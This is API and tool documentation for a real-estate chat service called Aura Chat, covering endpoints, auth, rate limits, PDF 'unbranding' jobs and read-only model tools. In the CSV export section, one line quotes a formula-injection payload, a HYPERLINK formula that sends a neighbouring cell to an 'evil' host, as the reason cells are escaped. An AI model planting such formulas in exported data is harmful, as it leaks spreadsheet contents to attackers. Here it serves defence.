# Aura Chat — endpoints and tools

Every HTTP route the service serves, and every tool the model may call.
Companion to [schema.md](schema.md) (what is stored) and
[operations.md](operations.md) (how to reach it).

`BASE` is the deployment's origin — `http://localhost:8000` locally, the Railway
URL in production. Getting `$TOK`: [operations.md §1](operations.md).

---

## 1. Endpoints

| Method | Path | Auth | What it is |
|---|---|---|---|
| `POST` | `/login` | none | Portal credentials in, a session token out |
| `GET` | `/health` | none | Liveness, for the platform probe |
| `GET` | `/doctor` | bearer, **unverified allowed** | Full diagnosis |
| `GET` | `/me` | bearer | The verified identity |
| `POST` | `/chat` | bearer | Ask a question; answers as SSE |
| `POST` | `/feedback` | bearer | Report on an answer |
| `GET` | `/feedback` | bearer, **admin** | The report queue |
| `GET` | `/feedback.csv` | bearer, **admin** | The same queue as a spreadsheet |
| `GET` | `/conversations` | bearer | This realtor's threads |
| `GET` | `/conversations/{id}` | bearer | One thread |
| `GET` | `/admin/chat/summary` | bearer, **admin** | How many people used Chat in the last 30 days |
| `GET` · `PUT` | `/admin/organization` | bearer, **admin** | The organization profile |
| `POST` | `/admin/unbrander/jobs` | bearer, **admin** | Upload a project's PDFs |
| `GET` | `/admin/unbrander/jobs` | bearer, **admin** | Jobs, newest first |
| `GET` | `/admin/unbrander/jobs/{id}` | bearer, **admin** | One job, its documents and audit log |
| `GET` | `/admin/unbrander/jobs/{id}/documents/{position}/pages/{page}.jpg` | bearer, **admin** | One page, source or output, as a JPEG |
| `GET` | `/admin/unbrander/jobs/{id}/documents/{position}/output.pdf` | bearer, **admin** | The cleaned PDF |
| `GET` | `/admin/unbrander/limits` | bearer, **admin** | Upload limits (files, MB per file, pages) and `can_file`: Drive set up and the worker on |
| `POST` | `/admin/unbrander/jobs/{id}/file` | bearer, **admin** | File an unbranded job in Drive |
| `GET` | `/admin/unbrander/summary` | bearer, **admin** | Jobs waiting and running, and jobs and cleaned pages since a date |
| `POST` | `/admin/unbrander/mark-preview` | bearer, **admin** | A brand's mark as a JPEG, before saving |

Every bearer route takes `Authorization: Bearer <portal session token>` — the
same token the PWA already holds. There is no second credential and no service
account ([invariants.md](invariants.md) 2).

Every response carries **`X-Request-Id`**, a twelve-character id that also
appears on that request's log lines. It is the thing to quote when reporting a
failure. See [§5 of operations.md](operations.md) for where the logs are.

### Ceilings (AUR-21)

| Route | Counted per | Default |
|---|---|---|
| `POST /chat` | user | 60 / hour |
| `POST /login` | client IP | 20 / hour |
| `GET /doctor` | client IP | 30 / hour |

Over the ceiling is `429` with `Retry-After` in seconds — named in
`expose_headers`, so a browser on another origin can actually read it. Raise the
ceilings with `CHAT_PER_HOUR`, `LOGIN_PER_HOUR`, `DOCTOR_PER_HOUR`. The counters
are in memory, per process: **a second replica doubles every number above.**

The IP-keyed ones read the **last** `X-Forwarded-For` entry, which is the one our
own proxy wrote. See [operations.md §2](operations.md) for what that assumes.

---

### `POST /login`

```json
{"user": "harvinder", "password": "…"}
```

→ `200 {"ok": true, "token": "…", "name": "Harvinder Babra", "role": "realtor"}`

`401` with the portal's own wording (which distinguishes a bad password from a
lockout), `502` if the portal did not answer. Nothing is stored or logged here:
the password exists for the length of one outbound request.

### `GET /health`

→ `200 {"status": "ok" | "degraded" | "down", "ok": true}`

Public, so it says whether we are serving — never which secret is missing. The
detail lives behind `/doctor`.

### `GET /doctor?fresh=1`

→ `200` with one entry per check: `app`, `portal_reachable`, `model`,
`portal_auth`, `token_verification`, `project_data`, `conversation_store`,
`document_index`, `data_quality`.

**Answers a caller whose token did not verify**, on purpose — that is the single
most valuable thing it can diagnose, and it is what tells a mismatched
`TOKEN_SECRET` apart from an expired session. Detail is redacted on every check
but those two when the token is unverified.

`?fresh=1` rebuilds the project cache. Slow and rate-limited upstream: it is the
answer to "I edited the sheet, why is Aura still saying the old thing?"

### `GET /me`

→ `200 {"user": "harvinder", "role": "realtor", "admin": false}`

The PWA calls this at sign-in to decide whether to draw the Reports row. It is a
courtesy, not a gate — `/feedback` checks the same claim itself.

### `POST /chat`

```json
{
  "question": "detached under $1M in Brampton",
  "mode": "realtor" | "client",
  "conversation_id": "uuid or null",
  "history": []
}
```

→ `200 text/event-stream`. Each frame is `data: {json}\n\n`:

| `type` | Payload | Meaning |
|---|---|---|
| `start` | `mode`, `conversation_id` | Sent first, always. The mode the server applied. |
| `tool` | `tool`, `args` | A tool is running — this is the status line |
| `tool_result` | `tool`, `count` | How many records it returned |
| `text` | `text` | An answer delta, not the whole answer |
| `projects` | `projects[]` | The records behind the answer, for cards |
| `done` | `usage` | Finished, with token counts |
| `error` | `detail` | Failed. Terminal. |

A stream can end **without** a terminator — a backgrounded phone, a proxy
timeout, a recycled container. A client that treats that as success leaves a
caret blinking under half an answer; treat a missing `done`/`error` as failure.

`mode` is a UI state, not an account property. It selects the `Viewer` here and
nothing downstream trusts the client with it again.

`history` is honoured **only** when there is no `conversation_id`. It exists for
phones that have not updated and will be removed once the rollout completes.

### `POST /feedback`

```json
{
  "answer_id": "…", "question": "…",
  "verdict": "up" | "down" | null,
  "category": "price_incorrect" | … | null,
  "note": "", "project_ids": []
}
```

→ `200 {"ok": true}`. `verdict` is null for a data-issue report: a thumb judges
the answer, a report judges the sheet. A report must say *something* — a verdict,
a category or a note.

Categories: `price_incorrect`, `deposit_incorrect`, `incentive_outdated`,
`occupancy_incorrect`, `missing_project`, `source_outdated`, `other`.

`user` comes from the token, never the body. `answer_id` is client-minted and
opaque — nothing is looked up by it, so a forged one costs a junk row.

### `GET /feedback?limit=100` · `GET /feedback.csv?limit=500` — admin only

→ `200 {"feedback": [ … ]}`, newest first. `403` for a realtor, `503` when the
store is unconfigured or down. The CSV has a fixed column order —
`created_at, user_id, verdict, category, question, note, project_ids` — because
columns that move between exports are columns nobody can build a filter on.

Any cell that would otherwise start with `=`, `+`, `-` or `@` is prefixed with a
single quote. `note` and `question` are typed by a realtor and this file exists
to be pasted into Sheets, so an unquoted `=HYPERLINK("https://evil/?x"&A1,…)`
would arrive as a live link carrying the neighbouring cell into a URL. The quote
is consumed on display — the reviewer sees what was typed.

### `GET /conversations?limit=30`

→ `200 {"conversations": [{"id", "title", "mode", "updated_at"}]}`, newest
first, capped at 50.

### `GET /conversations/{id}`

→ `200 {"conversation_id", "title", "mode", "messages": [{"id", "role",
"message", "sources", "created_at"}]}`, oldest first, up to 200.

`mode` is what the client applies **before** painting anything (AUR-57).
`sources` is `[{"id", "name"}]` — the projects an answer was built from, never
the project records themselves.

**A thread that is not yours returns `404`**, identical to one that never
existed. Telling those apart is itself a disclosure (AUR-40).

`503` — with the same sentence whether the store is unconfigured or unreachable
— means history is gone, not that chat is. Asking still works.

### `GET /admin/chat/summary` — admin only

→ `200 {"active_users", "days"}`: the number of distinct people with a
conversation written to in the last `days` (30). It counts everyone, which is
why it is admin only; `403` for anyone else, `503` without the store. The admin
app's Home shows it on the Chat card.

### `GET /admin/organization` · `PUT /admin/organization` — admin only

The profile in use: `{"name", "short_name", "assistant_name", "region", "brand":
{"mark_words": [{"text", "colour"}], "font", "size", "tracking", "opacity",
"margin"}}`. With nothing saved, the defaults in `app/domain/organization.py`.

`PUT` takes the whole profile, saves it and uses it at once: the chat runtime is
rebuilt, because it caches agents with the brokerage's name in their prompt, and
every new Unbrander job copies it. Jobs already uploaded keep the profile they
were given. `422` for a colour that is not `#RRGGBB`, a font other than Times,
Helvetica or Courier, or a mark word with anything but letters. `503` with no
database.

### `POST /admin/unbrander/jobs` — admin only

Multipart: `files` (1 to 10 PDFs), `project`, `builder`, `city`, and optionally
`short_forms` (comma-separated), `province` (default Ontario) and `instructions`
(free text for the models; it never overrides a guard).

→ `202 {"job_id", "status": "RECEIVED"}`. Every file is checked before anything is
kept, and one refusal refuses the upload: `413` over `UNBRANDER_MAX_FILE_MB`;
`422` for a file that is not a PDF by its content, does not open, is
password-protected, has more than `UNBRANDER_MAX_PAGES` pages, or carries
JavaScript, embedded files or launch actions (refused, not stripped). The
message names the file. Accepted while the worker is switched off: the job waits
in `RECEIVED`.

```bash
curl -H "Authorization: Bearer $ADMIN_TOK" \
  -F files=@prices.pdf -F files=@plans.pdf \
  -F project=SouthCal -F builder="Arista Homes" -F short_forms=AH -F city=Vaughan \
  localhost:8000/admin/unbrander/jobs
```

### `GET /admin/unbrander/jobs?status=&limit=50&documents=false` · `GET /admin/unbrander/jobs/{id}` — admin only

The list is newest first, without the profile copy. `status` may repeat
(`?status=RECEIVED&status=UNBRANDING`) to list any of several; none lists every
status. With `documents=true` the response also carries `documents`, each
listed job's documents by job id, so a screen of job cards needs one request,
not one per job; otherwise `documents` is `null`. One job comes
with `documents` (status, `doc_type`, `dropped_pages`, `page_map`,
`removed_items`, `findings`, `rounds`, `usage`, `cost_usd`, `drive_file_id`) and
`events`, its audit log, oldest first. `page_map` pairs each source page with
its output page, `null` when dropped. Every finding's `page` is a source page
number: verify() reads the output, and the worker converts its numbers before
storing them. Job statuses: `RECEIVED`, `UNBRANDING`, `UNBRANDED` (cleaned,
waiting for filing), `FILING`, `FILED_PRIVATE`, `FAILED`. Document statuses: `PENDING`, `UNBRANDING`, `VERIFIED`,
`BLOCKED` (failed verify(); kept on the volume, never filed), `FILED`, `FAILED`.

### `POST /admin/unbrander/jobs/{id}/file` — admin only

Files an `UNBRANDED` job in Drive: the worker uploads the documents that passed
(never a `BLOCKED` one) to the project's private folder, then the job is
`FILED_PRIVATE`. 202 with `{job_id, status: "FILING"}`; 409 from any other status,
or when it is already being filed (the status change is one conditional statement);
410 when its files were evicted after the retention period; 503 when Drive is not
set up or the worker is switched off. The request is an audit log line.
Uploading with `file_when_done=true` does the same without waiting; it is refused
with 422 at upload when Drive is not set up. One API for a person and an agent.

### `GET .../documents/{position}/pages/{page}.jpg?version=source|output` — admin only

`page` is the source page number for both versions, so the admin app pairs
before and after without counting dropped pages. Rendered at 110 dpi in a
worker thread; `Cache-Control: private, max-age=3600`, since a document's files
never change once written. 404 for a page out of range, a dropped page
(`version=output`), output not yet written, or files evicted after the
retention period.

### `GET .../documents/{position}/output.pdf` — admin only

The cleaned PDF as an attachment, named as it is filed in Drive (`Price
List.pdf`, `Floor Plan 2.pdf`), never by the upload's own name. A `BLOCKED`
document downloads too, for review. Each download is an audit log line.

### `POST /admin/unbrander/mark-preview` — admin only

Body: a `Brand` (the `brand` of the organization profile). Returns the bottom-right
corner of a blank Letter page with the mark in it (the margin stays in view; the
width follows the mark), drawn by the same code
that marks every cleaned PDF. 422 with field errors for an invalid brand. Needs
no database.

### `GET /admin/unbrander/summary?since=` — admin only

→ `200 {"to_review", "working", "jobs_since", "pages_cleaned_since"}`.
`to_review` is UNBRANDED jobs; `working` is RECEIVED, UNBRANDING and FILING.
`jobs_since` and `pages_cleaned_since` cover jobs uploaded since `since`; a page
counts when its document passed (VERIFIED or FILED) and the page was kept.
`since` is an ISO time, sent by the client because "this month" is the
brokerage's month in Toronto time; without one, the start of the current month
in UTC. A time with no zone is read as UTC. `503` without a database.

`/doctor` reports three Unbrander checks: `ocr`, `job_store` and
`unbrander_worker`. They are critical only while the worker runs.

---

## 2. Tools (AUR-89)

Five, in [`app/capabilities/chat/tools.py`](../../../app/capabilities/chat/tools.py). Plain async functions
over `ProjectRepo`; no framework and no adapter is imported there.

**Read-only by construction** (AUR-19): `ProjectRepo` has no write method, so
there is no write a tool could make.

**Redaction is not a step any tool takes.** The repo they are handed is a
`RedactingProjectRepo` built from the caller's verified claims, so an unredacted
`Project` is not something a tool can obtain — rather than something a tool must
remember to avoid. `tests/test_layering.py` fails if a `for_viewer` ever appears
in this file.

| Tool | Arguments | Reads |
|---|---|---|
| `search_projects` | `city`, `builder`, `categories[]`, `min_price`, `max_price`, `min_bedrooms`, `max_deposit_pct`, `occupancy`, `focus_only`, `query`, `limit` | Matching projects, at most 12 |
| `inventory_summary` | `city`, `builder`, `categories[]`, `focus_only`, `query` | Counts and names over **everything** that matches — no limit, because a truncatable summary is the bug it exists to fix |
| `get_project` | `ref` (id **or** exact name) | One project's current record |
| `compare_projects` | `project_ids[]` | Up to 4 records, side by side |
| `get_recent_projects` | `days`, `limit` | What changed lately, by the sheet's `LAST UPDATED` |

`categories` are the portal's own four buckets: `detached`, `semi`, `townhome`,
`condo`. Anything else matches nothing — see
[known-issues 3](known-issues.md).

`get_project` resolves a **name** as well as an id, because a realtor naming a
project is not handing over an id. An ambiguous name returns nothing, never a
guess: two Brampton projects are both called Mayfield Village, and picking one
produces a confident answer about the wrong builder's deposit schedule.

At most **6 model round trips** per question (`MAX_STEPS`), and at most 1500
output tokens (`LLM_MAX_TOKENS`).
